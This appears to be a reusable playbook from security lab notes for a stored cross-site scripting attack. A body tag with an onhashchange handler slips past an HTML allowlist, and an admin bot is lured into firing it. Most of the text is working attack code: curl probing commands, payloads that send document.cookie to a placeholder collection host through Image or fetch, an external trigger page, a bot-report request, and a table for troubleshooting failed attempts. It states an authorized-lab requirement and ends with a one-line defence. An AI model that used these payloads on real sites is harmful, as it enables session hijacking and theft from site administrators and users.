# Body onhashchange Allowlist XSS + Admin Bot

## Context

Use when:

- a profile/comment field keeps some HTML tags (allowlist)
- `<body>` or similar survives sanitization
- common handlers are stripped but `onhashchange` remains
- an admin/support bot visits attacker-controlled URLs (often external)

## Requirements

- Authorized lab, owned app, in-scope target, or defensive review.
- Do not store live flags, cookies, tokens, or private OAST URLs in reusable files.

## Allowlist Probe

```bash
# firstname / bio / etc.
curl -sS -b jar -X POST "https://[host]/editprofile" \
  --data-urlencode "firstname=<body>SAFE</body>" \
  --data-urlencode "lastname=L" \
  --data-urlencode "bio=<b>B</b>"
curl -sS -b jar "https://[host]/profile/[user]" | grep -n firstname -A2
```

Handler matrix (examples):

```html
<body onload=alert(1)>
<body onclick=alert(1)>
<body onhashchange=alert(1)>
<body onpageshow=alert(1)>
<body onfocus=alert(1) tabindex=1>
```

## Stored Payload

```html
<body onhashchange="new Image().src='https://[oast]/c?'+encodeURIComponent(document.cookie)">X</body>
```

Alternate exfil if `Image` is filtered:

```html
<body onhashchange="fetch('https://[oast]/c?'+encodeURIComponent(document.cookie))">X</body>
```

## External Trigger Page

Framing may be blocked (`frame-ancestors 'none'`). Prefer `window.open`:

```html
<!doctype html>
<html><body>
<script>
const lab = 'https://[host]/profile/[attacker]';
const o = 'https://[oast]';
new Image().src = o + '/start';
const w = window.open(lab);
setTimeout(function () {
  try {
    w.location = lab + '#pwn';
    new Image().src = o + '/hashset';
  } catch (e) {
    new Image().src = o + '/err?' + encodeURIComponent(String(e));
  }
}, 2500);
</script>
</body></html>
```

## Report To Bot

```bash
curl -sS -b jar -X POST "https://[host]/ticket" \
  --data-urlencode "message=please review" \
  --data-urlencode "url=https://[exploit-host]/"
```

## Expected Signal

```text
OAST /start          -> bot loaded opener
OAST /hashset        -> hash assignment attempted
OAST /c?flag=...     -> XSS fired on lab origin
```

## Common Failures

| Failure | Likely cause |
|---------|----------------|
| Attribute missing in HTML | handler stripped; try other uncommon `on*` |
| `/start` only | `window.open` blocked or profile URL wrong |
| `/hashset` but no `/c` | hash set on wrong window; timing too short; XSS not stored |
| Empty cookie | secrets HttpOnly; fetch privileged same-origin routes instead |
| Bio/img never hits OAST | that field is escaped, not allowlisted |

## Defensive Note

Strip all `on*` attributes; disallow `body`/`html`/`head` in user HTML; encode by default; keep secrets HttpOnly.

## Related

- `notes/html-allowlist-body-onhashchange-xss.md`
- `writeups/hashology-body-onhashchange-allowlist-xss.md`
